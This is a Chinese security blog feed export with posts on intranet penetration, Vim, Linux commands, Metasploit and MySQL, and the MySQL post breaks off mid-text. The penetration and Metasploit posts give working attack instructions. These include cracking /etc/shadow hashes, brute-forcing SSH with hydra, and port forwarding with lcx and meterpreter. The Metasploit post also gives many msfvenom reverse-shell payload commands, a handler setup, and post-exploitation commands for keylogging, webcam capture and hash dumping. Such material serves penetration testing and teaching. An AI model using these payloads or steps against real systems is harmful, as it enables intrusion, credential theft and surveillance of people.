扫描出内网服务器端口后，我们可以首先选择开放22端口的服务器进行入侵尝试。攻击22端口通常有2种方法，第一种是先读取肉鸡明文密码，再利用明文密码尝试登陆；第二种是字典暴力登陆。 尝试hash破解如果权限足够，我们可以顺利读取/etc/shadow文件的内容，然而是密文的，因此可以尝试用工具破解。 John破解hash Hashcat 注：windows下可以使用mimikatz 说明：获取linux账号的明文密码作用很大，因为内网环境管理员可能就那么几个，不同服务器所设置的密码也有可能相同，因此可以使用获取的服务器密码去尝试登陆其余开放了22端口的内网服务器。 字典暴力破解这个没啥好说的，主要看字典是否强大，以及是否有防止爆破限制。工具： hydra msf上的相应模块 针对其他端口的入侵 除了22端口外，21（ftp）、3306（mysql）、1433（mssql）等都可以通过暴力破解的方式。那么其他段端口呢？比如445、443等，这些则可以通过相应的漏洞进行攻击，通过可以使用nessus扫描器进行扫描，对发现的漏洞再集合msf上相应的模块进行攻击。 针对web服务的入侵 除了以上的端口外，还有一类端口比较特殊，那就是web服务类的端口，比如80、443、8000+等。由于这些端口上存在web应用，而web应用又是容易存在漏洞的点。因此可以重点寻找内网中存在web服务的服务器，并依照web渗透测试的流程对其web应用进行渗透。 端口转发的逆袭 前文介绍了端口转发技术，但在扫描环节中我并没有使用这种方案。那么是不是说端口转发在内网渗透中没有用武之地呢？ 事实并不是这样，内网扫描过后的漏洞利用攻击阶段，才是端口转发真正的舞台。在此阶段，我们可以利用端口转发，将某个存在漏洞的服务器的某个端口转发出来，单独攻击利用。我们可以想到在windows中，利用lcx转发3389端口，linux下同样可以转发22端口，当然更好用的是转发80端口，达到可以本地访问内网的web服务，从而继续web渗透的套路，扩大攻击面。 meterpreter实现端口转发在meterpreter shell中输入：1meterpreter &gt; portfwd add -l 55555 -r 192.168.16.1 -p 3306 说明：表示将192.168.16.1服务器上的3306端口转发到本地（攻击机）的55555端口，然后我们可以在本地运行mysql –h 127.0.0.1 –u root –P 55555 –p 去登陆内网服务器的mysql。其他端口如ssh、ftp等都类似，这个过程跟msf代理很像。 案例将肉鸡的22端口转发到攻击机的2222端口，看一下连接情况。发现攻击机上监听了2222端口，连接到了本机其外一个高端口。肉鸡的22端口也连接到了肉鸡自己的一个高端口那么两台服务器之间的两个高端口之间是怎么连接的，我想肯定是利用meterpreter会话。因此meterpreter会话就相当于一个中间人，传递原本无法传递的消息。 lcx端口转发攻击机:1lcx -listen 2222 3333 # 2222为转发端口，3333为本机任意未被占用的端口 肉鸡：1lcx -slave 110.1.1.1 2222 127.0.0.1 3389 110.1.1.1为攻击机外网ip，2222为转发端口，127.0.0.1为肉鸡内网ip，3389为远程终端端口 。 内网嗅探 windows下可以使用cain，linux下可以使用msf中的模块。当然一般情况下，最好不要用内网嗅探，因为动静太大，而且可能会影响内网网络。 linux内网安全建议说了这么多内网渗透的套路，按惯例最后该给出内网安全建设的几点建议了，当然只是个人看法，可以一起留言讨论。 每台服务器上安装监控软件，监控并拦截木马程序的运行（监控木马文件以及行为） 监控服务器上开启的新端口，查看其连接情况，是否有异常连接（监控异常端口） 服务器及时更新补丁，以及最新系统漏洞补丁（减少漏洞） 服务器上运行的应用给予低权限（增加提权的难度） 不必要连接外网的服务器，禁止连接外网（减少被入侵的风险） 日志记录并且实时监控（监控异常操作以及暴力破解行为） 参考文章http://bobao.360.cn/learning/detail/4164.htmlhttp://bobao.360.cn/learning/detail/3204.htmlhttp://www.freebuf.com/sectool/56432.htmlhttp://www.freebuf.com/articles/network/125278.html 传送门【玩转linux系列】Vim使用【玩转linux系列】Linux基础命令【玩转linux系列】shell编程]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【玩转linux系列】Vim使用]]></title>
    <url>../../../../../../../../2017/08/09/1/</url>
    <content type="text"><![CDATA[The secret of success is constancy of purpose成功的秘诀在于持之于恒 工作中有时需要在linux服务器上写代码，然而习惯了sublime，突然切换到linux下的vim感觉很不习惯，编程效率自然下降了很多。但这并不是说vim编辑器本身效率低下，而是我并没有发挥出它强大的功能（据说大神都是用vim），为了能加快编程的效率，简单学习总结下vim的用法。 复制剪切粘贴123yy # 复制一行dd # 剪切一行p # 粘贴 查找单词123bin/bash&gt;:/nmask # 查找存在nmask字符串的位置或者bin/bash&gt;:?nmask # 查找存在nmask字符串的位置 继续查找下一个存在nmask字符串的位置 n 往上查找 N 往下查找 编辑器显示设置123:set nu! # 显示行号:set autoindent # 自动缩进:syntax enable # 语法高亮 文件内容定位12345gg # 首行G # 末行XG # 定位到第X行或者：bin/bash&gt;：10 # 定位到第10行 插入数据1o # 在当前行下插入一行 保存退出123ZZ # 保存退出ZQ # 不保存退出bin/bash&gt;：w filename # 另存为 字符替换1bin/bash&gt;:％s/regexp/replacement/g # 文本中所有匹配的都替换 行内移动12（ # 移动到句首） # 移动到句尾 vim保存没有权限的文件文件只读使用:w!强制写入或者:set noreadonly然后只要使用正常的:w 不能写，但有sudo权限。1:w !sudo tee % 这是一个接收管道信息并可以写入文件的命令。 无权写入该文件，没有管理员权限sudo使用:w! ~/tempfile.ext将更改写入临时文件，然后采取措施将临时文件移动到目录(将临时文件发送到目录所有者/管理员)。 传送门【玩转linux系列】Linux基础命令【玩转linux系统】Linux内网渗透【玩转linux系列】shell编程]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【玩转Linux系列】Linux基础命令]]></title>
    <url>../../../../../../../../2017/08/08/1/</url>
    <content type="text"><![CDATA[即使跌倒了，你要懂得抓一把沙子在手里。 随着对安全技术探索的逐步深入，我深刻体会到掌握linux系统对于安全研究的重要性。而掌握Linux系统首先必须得学会一些常用的linux命令，其次再去掌握一些linux常用工具，最后再是深入理解linux系统内核等。因此本篇作为该系列的第一篇，主要用来记录分享一些自己常用且基础的Linux命令。 命令帮助解析命令的意思(whatis、info)12whatis whoami 解析命令的意思info whoami 详细解析命令的意思 寻找命令的安装路径(which、whereis)12which whoami 寻找命令的位置whereis whoami 寻找程序的位置 目录管理目录查看(ls)查看目录结构1tree 查看当前目录下所有子文件夹排序后的大小1du -sh `ls` | sort 查看目录下文件个数1find ./ | wc -l 按时间排序，以列表的方式显示目录项1ls -lrt 给每项文件前面增加一个id编号1ls | cat -n 显示可阅读的文件大小：1ll -h 文件目录权限(chmod、chown)1234改变文件的拥有者 chown改变文件读、写、执行等属性 chmod递归子目录修改： chown -R tuxapp source/增加脚本可执行权限： chmod a+x myscript 文件管理文件创建删除(touch、echo、rm -f)删除日志文件1rm *log (等价: $find ./ -name “*log” -exec rm &#123;&#125; ;) 文件查看(du -sh)查看文件大小1du -sh 文件名 统计文件行数1wc -l test.txt 文件内容查看(cat、head、tail)显示时同时显示行号1cat -n （如：cat test.txt | cat -n） 动态查看文件内容：1tail -f filename #当有内容写入文件中再输出 正向逆向查看文件内容12head -1 filename # 第1行内容tail -5 filename # 倒数5行内容 JSON格式化输出(jq)1cat test.json | jq 也可以使用python模块：1cat test.json | python -m json.tool 文件搜索(find)linux 复制特定后缀文件（保持目录结构）:1tar cvf my_txt_files.tar `find . -type f -name "*.jsp*"` 递归当前目录及子目录并删除所有.log文件1find ./ -name "*.log" -exec rm &#123;&#125; \; 否定参数查找所有非txt文本1find . ! -name "*.txt" -print 按类型搜索1find . -type d -print //只列出所有目录 最近7天内被访问过的所有文件1find . -atime -7 -type f -print 文件内容搜索(grep)查看成功登陆ssh的IP地址：12345centosfor i in `grep 'sshd' /var/log/secure* | grep -oE '\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;' | sort | uniq`; do curl -s --header "X-Forwarded-For: $i" http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P '(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)' ; doneubuntu：for i in `grep 'sshd' /var/log/auth.log* |grep 'Accepted' |grep ftp| grep -oE '\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;' | sort | uniq`; do curl -s --header "X-Forwarded-For: $i" http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P '(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)' ; done 递归目录搜索返回文本内容存在class字符串的行号1grep "class" . -R -n 非匹配(-v)1ps -ef | grep -v "python" #匹配除了python进程 文件内容排序(sort) -n 按数字进行排序 VS -d 按字典序进行排序 -r 逆序排序 -k N 指定按第N列排序 12sort -nrk 1 data.txtsort -bd data // 忽略像空格之类的前导空白字符 消除重复行(uniq)消除重复行1sort unsort.txt | uniq 统计各行在文件中出现的次数1sort unsort.txt | uniq -c 找出重复行1sort unsort.txt | uniq -d 磁盘管理查看磁盘空间利用大小1df -h 挂载U盘1234fdisk -l 查看U盘路径monut /dev/sdb4 /mnt 挂载U盘cd /mnt 进入U盘umount /mnt 退出U盘 进程管理杀死python相关的进程123ps -ef | grep python | cut -d ' ' -f 2 | xargs kill或者pkill -9 python #-9表示强制删除，pkill以进程名字匹配 查看进程1ps -ef | less 查看端口占用的进程状态：1lsof -i:3306 网络管理查看网络连接1netstat -an | less 查看网络路由1route -n 只查看ip信息1ifconfig | grep inet 系统管理查看系统位数1getconf LONG_BIT 查看系统版本1lsb_release -a 查看hosts文件1cat /etc/hosts 查看CPU的核的个数1cat /proc/cpuinfo | grep processor | wc -l 查看系统信息12345678uname -auname -m 显示机器的处理器架构uname -r 显示正在使用的内核版本cat /proc/cpuinfo 显示CPUinfo的信息cat /proc/meminfo 校验内存使用cat /proc/version 显示内核的版本cat /proc/net/dev 显示网络适配器及统计cat /proc/mounts 显示已加载的文件系统 性能管理CPU(sar)查看CPU使用率1sar -u 查看CPU平均负载1sar -q 1 2 内存查看内存使用情况123sar -r 1 2或者free -m 网络流量监控(iftop)1sudo iftop -i eth1 -B #-i 指定网卡，-B以byte显示，可以使用-h查看帮助信息 服务器性能查看(htop)top的加强版，推荐安装使用。1htop 网络流量(dstat)推荐使用。1dstat 其他内容管道和重定向(|、||、&amp;&amp;、&gt;、&gt;&gt;) 批处理命令连接执行，使用 | 串联使用分号 ; 前面成功，则执行后面一条，否则不执行:&amp;&amp; 前面失败，则后一条执行: || &gt;覆盖原有内容 &gt;&gt;文件后追加内容 重定向12echo test &gt; test.txt #覆盖原有内容echo test &gt;&gt; test.txt #文件后追加内容 清空文件1:&gt; test.txt nohup输出重定向1nohup python revice_true_link.py &gt; ./log/true_link.log &amp; Bash快捷键 Ctl-U 删除光标到行首的所有字符,在某些设置下,删除全行 Ctl-W 删除当前光标到前边的最近一个空格之间的字符 Ctl-H backspace,删除光标前边的字符 Ctl-R 匹配最相近的一个文件，然后输出 Ctl-a 光标移动到行首 Ctl-e 光标移动到行尾 资源下载访问远程资源，下载资源 wget 作用：下载远程文件 如：http://www.xxx.com/1.txt curl 作用：访问网页，返回包内容 程序运行 watch 运行的脚本 -n 秒数 （几秒钟执行一次，不加n默认为2秒） nohup 要运行的程序 &amp; (让程序在后台运行，忽略所有挂断信号) Linux学习网站 http://linuxtools-rst.readthedocs.io/zh_CN/latest/ http://man.linuxde.net/ 本文内容参考http://linuxtools-rst.readthedocs.io/zh_CN/latest/ 传送门【玩转linux系统】Linux内网渗透【玩转linux系列】Vim使用【玩转linux系列】shell编程 注：本文内容部分来自互联网整理，部分来自个人经验总结；本文将持续收集更新，欢迎留言补充！]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透神器系列】Metasploit]]></title>
    <url>../../../../../../../../2017/08/01/1/</url>
    <content type="text"><![CDATA[Learn to walk before you run先学走，再学跑 今天玩了一把内网渗透，其中主要用到了metasploit这款内网渗透神器。metasploit大家肯定不陌生，我也在很早之前就有接触过，但每次重新使用它时都会遗忘一些用法，因此为了方便查询我在本篇记录下metasploit神器的一些常用命令，以及内网渗透中如何使用它。 Mac下安装metasploitmac下安装metasploit比较简单，官网下载pkg安装包，直接安装即可；需要注意的是安装完成后的路径。msfconsole路径：1/opt/metasploit-framework/bin 该目录下还有其他几个常用的工具：msf的插件路径：1/opt/metasploit-framework/embedded/framework/modules/exploits msfvenom作用：生成木马文件，替代早期版本的msfpayload和msfencoder。 Optionsmsfvenom命令行选项如下：12345678910111213141516171819-p, --payload &lt;payload&gt; 指定需要使用的payload(攻击荷载)-l, --list [module_type] 列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all-n, --nopsled &lt;length&gt; 为payload预先指定一个NOP滑动长度-f, --format &lt;format&gt; 指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)-e, --encoder [encoder] 指定需要使用的encoder（编码器）-a, --arch &lt;architecture&gt; 指定payload的目标架构 --platform &lt;platform&gt; 指定payload的目标平台-s, --space &lt;length&gt; 设定有效攻击荷载的最大长度-b, --bad-chars &lt;list&gt; 设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;-i, --iterations &lt;count&gt; 指定payload的编码次数-c, --add-code &lt;path&gt; 指定一个附加的win32 shellcode文件-x, --template &lt;path&gt; 指定一个自定义的可执行文件作为模板-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行 --payload-options 列举payload的标准选项-o, --out &lt;path&gt; 保存payload-v, --var-name &lt;name&gt; 指定一个自定义的变量，以确定输出格式 --shellest 最小化生成payload-h, --help 查看帮助选项 --help-formats 查看msf支持的输出格式列表 options usage查看支持的payload列表：1msfvenom -l payloads 查看支持的输出文件类型：1msfvenom --help-formats 查看支持的编码方式：(为了达到免杀的效果)1msfvenom -l encoders 查看支持的空字段模块：(为了达到免杀的效果)1msfvenom -l nops 基础payload命令格式1msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt; Linux1234反向连接：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf正向连接：msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf Windows1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe Mac12msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoWeb Payloads PHP12msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php ASP1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp JSP1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp WAR12msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.waScripting Payloads Python1msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py Bash1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh Perl1msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl Linux Based Shellcode1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; Windows Based Shellcode1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; Mac Based Shellcode12msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;Handlers payload加编码命令格式：1msfvenom -p &lt;payload&gt; &lt;payload options&gt; -a &lt;arch&gt; --platform &lt;platform&gt; -e &lt;encoder option&gt; -i &lt;encoder times&gt; -b &lt;bad-chars&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt; 常用编码：12x86/shikata_ga_naicmd/powershell_base64 例子：1msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 -f exe &gt; 1.exe 自选模块生成执行计算器payload例子：1msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; 1.exe payload的坑正常情况下，利用msfvenom生成的木马文件，可直接上传到目标服务器上运行（加权限）。但我自己遇到过一个坑，生成的文件内容有部分是无用的，会引起报错，如下图所示。解决方案是vim文件，删除文件开头两行无效的内容。 msfconsole作用：用来在命令行下启动metasploit。启动后可看到metasploit当前版本，以及各个模块的插件数量。 auxiliary扫描模块 exploits漏洞利用模块 payloads encoders编码模块 nops空字符模块 search寻找模块比如寻找ms15_034漏洞的利用插件1search ms15_034 配合木马弹Shell前面我介绍了如何使用msfvenom生成木马文件，这里我介绍如何使用msf连接上被执行的木马文件，达到控制目标服务器。 常用payload首先我们回顾一下生成木马文件的命令，其中有一个payload的选项，常用的几个payload。linux相关payload：123456linux/x86/meterpreter/reverse_tcplinux/x86/meterpreter/bind_tcplinux/x86/shell_bind_tcplinux/x86/shell_reverse_tcplinux/x64/shell_reverse_tcplinux/x64/shell_bind_tcp windows相关payload:12345678windows/meterpreter/reverse_tcpwindows/meterpreter/bind_tcpwindows/shell_reverse_tcpwindows/shell_bind_tcpwindows/x64/meterpreter/reverse_tcpwindows/x64/meterpreter/bind_tcpwindows/x64/shell_reverse_tcpwindows/x64/shell_bind_tcp 注意：含有x64只适用目标服务器为64位操作系统的，没有x64或者使用x86的只适用32位操作系统；含有meterpreter的模块会反弹meterpreter_shell，而普通的shell模块只会反弹普通的shell（反弹结果跟nc类似）；reverse_tcp表示木马会主动连接目标服务器，bind_tcp表示木马会监听本地的端口，等待攻击者连接。因此生成的木马文件，要根据具体情况而定。 payload选择前面介绍了常用的payload，那么payload选择的三大要素如下： 木马连接的方向 目标操作系统及版本 反弹的shell类型 木马连接方向：msf木马分为正向连接与反向连接，正向连接适合攻击机能给连接目标机的情况，反向连接使用目标机能连接攻击机的情况，这里所说的连接一般是指tcp的某个端口。因此在生成木马前，需要先判断当前环境，适合正向连接木马还是反向连接的木马。（可以使用nc工具测试，详细参考：【渗透神器系列】nc） 目标操作系统类型查看：这个不说了！操作系统位数查看：1getconf LONG_BIT 反弹shell类型：这个主要取决于反弹的shell的用途，一般执行系统命令的话普通操作系统的shell就够了。如果想要使用高级功能，比如：键盘记录，开启摄像头，添加路由等功能，可以使用meterpreter_shell。 连接木马开启msf，启用exploit/multi/handler模块。123456use exploit/multi/handlerset payload linux/x86/meterpreter/bind_tcpshow optionsset RHOST 10.0.0.1set LPORT 12345 exploit 注意：这里set的payload跟生成木马使用的payload要一致，其余的参数根据选择的payload而填写。 meterpreter shell当我们拿到目标服务器的meterpreter_shell后，可以进行很多操作。123backgroud 将msf进程放到后台session -i 1 将进程拖回前台运行run vnc 远程桌面的开启 文件管理功能：12345678Download 下载文件Edit 编辑cat 查看mkdir 创建mv 移动rm 删除upload 上传 rmdir 删除文件夹 网络及系统操作：1234567891011Arp 看ARP缓冲表Ifconfig IP地址网卡Getproxy 获取代理Netstat 查看端口链接Kill 结束进程Ps 查看进程Reboot 重启电脑Reg 修改注册表Shell 获取shellShutdown 关闭电脑sysinfo 获取电脑信息 用户操作和其他功能讲解:1234567891011enumdesktops 用户登录数keyscan_dump 键盘记录－下载keyscan_start 键盘记录 － 开始keyscan_stop 键盘记录 － 停止Uictl 获取键盘鼠标控制权record_mic 音频录制webcam_chat 查看摄像头接口webcam_list 查看摄像头列表webcam_stream 摄像头视频获取Getsystem 获取高权限Hashdump 下载ＨＡＳＨ meterpreter添加路由大多时候我们获取到的meterpreter shell处于内网，而我们需要代理到目标内网环境中，扫描其内网服务器。这时可以使用route功能，添加一条通向目标服务器内网的路由。 查看shell网络环境：1meterpreter&gt;run get_local_subnets 添加一条通向目标服务器内网的路由1meterpreter&gt;run autoroute -s 100.0.0.0/8 (根据目标内网网络而定) 查看路由设置：1meterpreter&gt;run autoroute –p 一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf&gt;，查看下外面的路由情况。1route print 如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。1msf&gt;route add 10.0.0.0 255.0.0.0 1 说明：1表示session 1，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。 meterpreter端口转发假设目前我们扫描到了10网段的某个ip存在mysql弱口令，账号密码都有了，那么我们可以在肉鸡服务器上登陆目标服务器mysql。当然，如果我想在攻击机上去登陆mysql，可以使用端口转发。（某些情况下，内网的机器也不能互相ssh，需要登陆堡垒机） 在meterpreter shell中输入：1meterpreter &gt; portfwd add -l 55555 -r 10.0.0.1 -p 3306 表示将10.0.0.1服务器上的3306端口转发到本地的55555端口，然后我们可以在本地运行mysql –h 127.0.0.1 –u root –P 55555 –p 去登陆mysql。其他端口如ssh、ftp等都类似，这个过程跟msf代理很像。 网络上关于metasploit用法的资料很多，这里主要记录一些常用用法，以及个人使用过程中的一些坑 参考文章：http://www.freebuf.com/sectool/72135.htmlhttp://blog.csdn.net/lzhd24/article/details/50664342http://blog.csdn.net/qq_34457594/article/details/52756458http://www.freebuf.com/sectool/56432.htmlhttp://www.freebuf.com/articles/network/125278.html 传送门【渗透神器系列】DNS信息查询【渗透神器系列】nc【渗透神器系列】nmap【渗透神器系列】Fiddler【渗透神器系列】搜索引擎【渗透神器系列】WireShark]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>渗透神器</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql相关笔记]]></title>
    <url>../../../../../../../../2017/07/26/1/</url>
    <content type="text"><![CDATA[Take control of your own desting命运掌握在自己手上 最近由于项目需要，特地研究了下mysql数据库。虽然大学期间曾学习过mysql，但由于之前开发一直用rethinkdb以及mongodb数据库，因此对mysql已经有些生疏了。最近在使用期间也遇到了很多坑，但幸好最终还是靠着强大的Google解决了所有问题。因此在此记录下mysql相关问题的一些笔记，其中可能会涉及Mysql安全相关的问题，比如利用mysql导出shell、mysql提权等，权当备份。 Install Mysqlfor ubuntu12sudo apt-get install mysql-serversudo apt-get install phpmyadmin Ubuntu上安装mysql几乎都是自动安装的，在安装过程中可以选择额外安装php／apache2。 for centos12345wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpmrpm -ivh mysql-community-release-el7-5.noarch.rpmyum install mysql-community-serveryum install phpmyadminyum install httpd Mysql基础命令想要mysql玩得6，mysql命令行必须会用，或者说sql必须会，一起复习一下吧。 数据库操作查看数据库：1show databases; 使用数据库：1use 数据库名称; 新建数据库：1CREATE DATABASE mydb; 删除数据库：1DROP DATABASE mydb; 数据库表操作查看当前数据库表：1show tables; 创建数据表：12345678CREATE TABLE teacher(id int primary key auto_increment,name varchar(20),gender char(1),age int(2),birth date,description varchar(100),); 查看表结构：1desc 表名; 删除表（DROP TABLE语句）：1DROP TABLE teacher; 注：drop table 语句会删除该的所有记录及表结构 修改表结构（ALTER TABLE语句）： alter table test add column job varchar(10); –添加表列 alter table test rename test1; –修改表名 alter table test drop column name; –删除表列 alter table test modify address char(10) –修改表列类型（改类型） alter table test change address address1 char(40) –修改表列类型（改名字和类型，和下面的一行效果一样） alter table test change column address address1 varchar(30)–修改表列名（改名字和类型） 数据操作添加数据：1INSERT INTO 表名(字段1,字段2,字段3) values(值，值，值); 查询数据：1select * from 表名; 修改数据：1UPDATE 表名 SET 字段1名=值,字段2名=值,字段3名=值 where 字段名=值; 删除数据：1DELETE FROM 表名; 以上命令是最最基础的，但也是最常用的 常用Sql语句获取固定数量的结果1select * from table limit m,n 说明：其中m是指记录开始的index，从0开始，表示第一条记录；n是指从第m+1条开始，取n条。1select * from table limit 0,n 说明：查询前n条结果。1select * from table limit m,-1 说明：查询m行以后的结果。 查询字符串1SELECT * FROM table WHERE name like '%PHP%' 说明：%表示模糊查询，%php表示以php结尾的所有结果，%php%表示包含php的所有结果。 非空查询查询address字段不为空的结果。1SELECT * FROM table WHERE address &lt;&gt;'' 判断查询查询age在0-18之间的结果。1SELECT * FROM table WHERE age BETWEEN 0 AND 18 查询结果的数量1select count(*) from table 查询结果不显示重复记录1SELECT DISTINCT 字段名 FROM 表名 WHERE 查询条件 注:SQL语句中的DISTINCT必须与WHERE子句联合使用，否则输出的信息不会有变化 ,且字段不能用*代替。 查询排序12SELECT 字段名 FROM tb_stu WHERE 条件 ORDER BY 字段 DESC 降序SELECT 字段名 FROM tb_stu WHERE 条件 ORDER BY 字段 ASC 升序 注:对字段进行排序时若不指定排序方式，则默认为ASC升序。 多条件查询排序1SELECT 字段名 FROM tb_stu WHERE 条件 ORDER BY 字段1 ASC 字段2 DESC 全文检索使用全文检索前，先要建立字段索引，比如我要这样查询：1match(`name`,`name2`) aganst("abc" IN BOOLEAN MODE) 即查询name或者name2字段中存在字符串abc的记录，则需要事先将name与name2字段做联合的索引，类似于这样： 多表全文检索1select * from a left join b on a.pid = b.pid WHERE MATCH(`id`,`ip`) AGAINST("abc" IN BOOLEAN MODE) OR MATCH(`name`,`port`) AGAINST("123" IN BOOLEAN MODE) 说明：其中字符串abc也可以用%s代替，参数化构造sql语句。值得注意的是，默认情况下mysql只支持4个字符以上的全文索引。即搜索”nginx”是可以的，但是搜索”tcp”就不行。解决方案是通过修改/etc/my.conf配置文件，增加一行ft_min_word_len = 2，然后重启mysql，重新建索引（但是我测试失败了）。 全文检索模糊匹配与精确匹配当我们搜索:thief.one，若不用双引号包括，则会匹配出存在thief、one的结果，因为默认会使用.来分割字符串，搜索就变成了存在thief或者one的字符串，因此精确搜索为:”thief.one”就可以解决，因为把其当成了一个完整的字符串。 多表联合查询多表查询有三种方式：交叉查询、等值查询、外部查询（左连接、右连接）参考：http://blog.csdn.net/hguisu/article/details/5731880 交叉连接查询交叉查询可将2表中所有的数据都查出，比较耗时。123SELECT * FROM table1 CROSS JOIN table2 SELECT * FROM table1 JOIN table2 SELECT * FROM table1,table2 等值连接查询1SELECT * FROM table1 INNER JOIN table2 外部连接查询这种查询是最常用的，查找出a与b表中公有的，另外查出只有a表或b表独有的。12select id, name from user left join techer on user.id = teacher.idselect id, name from user right join techer on user.id = teacher.id 三表查询1select id, name from user left join techer on user.id = teacher.id left join home on teacher.id=home.id 导出数据库为sql文件1mysqldump -uusername -ppassword db_name &gt; file_name.sql Mysql使用权限问题mysql初始化设置密码当我们刚在服务器上安装完mysql，默认是可以无密码登陆的1mysql -u root 当然，我们肯定要为mysql设置密码，那么怎么设置最方便呢？1234&gt;&gt;use mysql;&gt;&gt;update user set host = '%' where user = 'root';&gt;&gt;UPDATE user SET Password=PASSWORD('nmask') where USER='root';&gt;&gt;flush privileges; 注意：这里需要注意一点，以上命令输入成功之后，仍然无法用root账号密码登陆，这是为什么呢？因为默认root账户有好几个，会影响设置密码的这个root账户，需要将其余几个root账户都删除。12&gt;&gt;delete from user where user='root' and host!='%';&gt;&gt;flush privileges; 重启mysql，应该可以使用设置了密码的root账户登陆了。 忘记密码？安全模式如果忘记了mysql密码怎么办？没事，可以进入安全模式，重设密码。 首先，我们停掉MySQL服务：1sudo service mysqld stop 以安全模式启动MySQL：1sudo mysqld_safe --skip-grant-tables --skip-networking &amp; 注意我们加了–skip-networking，避免远程无密码登录 MySQL。这样我们就可以直接用root登录，无需密码：1mysql -u root 接着重设密码：123mysql&gt; use mysql; mysql&gt; update user set password=PASSWORD("nmask") where User='root'; mysql&gt; flush privileges; 重设完毕后，我们退出，然后启动 MySQL 服务：1sudo service mysql restart 参考：http://www.ghostchina.com/how-to-reset-mysqls-root-password/ 只能本地连接mysql，远程机器连接不了？当我在服务器上搭建好mysql，输入以下命令：123[root@ ~]# mysql -u root -pEnter password:mysql&gt; 当输入mysql密码，出现mysql&gt;提示后，说明已经成功登陆mysql。 我满心欢喜地打开自己的mac，准备远程连接服务器上的mysql，结果如下：123[Mac~]mysql -u root -p -h 192.168.2.2Enter password: ERROR 1045 (28000): Access denied for user 'root'@'192.168.2.2' (using password: YES) 显示登陆失败，原因是mysql默认只支持本地登陆，不支持远程登陆。 解决方案第一步，登陆mysql（服务器本地登陆，因为远程登陆不了），查看user表（内置表）1234567891011mysql&gt; use mysql; #选择mysql数据库（mysql是数据库名称）mysql&gt; select host,user,password from user; 